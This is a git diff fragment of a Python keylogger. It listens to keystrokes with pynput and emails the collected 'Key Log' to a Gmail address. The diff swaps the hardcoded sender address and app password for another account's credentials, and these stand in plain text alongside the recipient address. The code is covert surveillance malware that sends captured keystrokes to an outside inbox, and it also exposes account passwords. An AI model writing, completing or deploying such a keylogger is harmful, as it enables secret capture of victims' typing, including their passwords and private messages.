@@ -35,8 +35,8 @@ def on_release(key):
 
 def send_email():
     try:
-        email = "tiwariraghav2001@gmail.com"
-        password = "yqwbjwcliqblzycg"
+        email = "myfakeaccoun625262@gmail.com"
+        password = "yxyk pctc hrjo otaz"
         send_to_email = "tiwariraghav16@gmail.com"
         subject = "Key Log"
 
@@ -77,3 +77,7 @@ def send_email():
 
 with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
+
+
+
